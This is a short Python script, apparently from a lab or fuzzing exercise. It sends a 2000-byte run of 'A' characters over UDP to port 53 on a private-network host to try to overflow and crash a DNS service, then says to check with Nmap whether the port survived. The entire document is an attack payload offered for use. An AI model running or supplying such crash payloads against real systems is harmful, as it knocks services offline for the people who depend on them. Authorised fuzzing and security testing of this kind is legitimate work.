import socket

# This sends a massive "A" string to trigger a potential buffer overflow
target = ("192.168.4.43", 53)
payload = b"A" * 2000 

s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) # UDP for DNS
print(f"Sending crash payload to {target}...")
s.sendto(payload, target)
print("Payload sent. Now run Nmap to see if Port 53 is still open.")

